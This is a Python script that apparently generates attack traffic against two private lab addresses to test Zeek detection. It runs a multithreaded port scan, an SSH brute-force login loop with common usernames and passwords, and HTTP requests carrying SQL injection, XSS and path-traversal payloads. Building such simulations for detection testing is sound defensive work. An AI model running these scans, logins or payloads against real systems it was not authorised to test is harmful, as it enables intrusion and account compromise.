#!/usr/bin/env python3
import time
import socket
import paramiko
import logging
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

SERVERS = ["192.168.10.10", "192.168.10.11"]
PORTS_TO_SCAN = [21, 22, 23, 80, 443, 445, 8080, 3306]

def port_scan(target_ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        # Attempt connection (generates REJ traffic in Zeek if closed)
        s.connect_ex((target_ip, port))
        s.close()
    except Exception:
        pass

def simulate_ssh_bruteforce(target_ip):
    # Small dictionary for rapid testing
    usernames = ["root", "admin", "sysadmin"]
    passwords = ["123456", "password", "admin"]
    
    for user in usernames:
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                # Very short timeouts for fast brute-forcing
                ssh.connect(target_ip, username=user, password=pwd, timeout=1, auth_timeout=1)
                ssh.close()
            except Exception:
                pass

def simulate_web_attacks(target_ip):
    import urllib.request
    import urllib.parse
    # List of malicious payloads (SQL Injection and XSS)
    payloads = [
        "1' OR '1'='1",              # Classic SQLi
        "admin' --",                 # SQLi bypass
        "<script>alert(1)</script>", # Classic XSS
        "../../../etc/passwd"        # Path Traversal
    ]
    for payload in payloads:
        try:
            # Send payload in the query string
            encoded_payload = urllib.parse.quote(payload)
            url = f"http://{target_ip}/login?user={encoded_payload}"
            urllib.request.urlopen(url, timeout=1)
        except Exception:
            pass

def main():
    logging.info("Starting SIMULATED ATTACK (Port Scan + SSH Bruteforce)...")
    
    # 1. Multi-Threaded Port Scan
    logging.info("Phase 1: Executing rapid Port Scan on target subnets...")
    with ThreadPoolExecutor(max_workers=20) as executor:
        for server in SERVERS:
            for port in PORTS_TO_SCAN:
                executor.submit(port_scan, server, port)
                
    time.sleep(2)
    
    # 2. SSH Brute Force
    logging.info("Phase 2: Executing SSH Brute-Force...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        for server in SERVERS:
            executor.submit(simulate_ssh_bruteforce, server)
            
    time.sleep(2)
            
    # 3. Web Attacks (SQLi / XSS)
    logging.info("Phase 3: Executing Layer 7 Web Attacks (SQLi & XSS)...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        for server in SERVERS:
            executor.submit(simulate_web_attacks, server)
            
    logging.info("Simulated attack completed. Check Zeek logs for anomalies.")

if __name__ == "__main__":
    main()
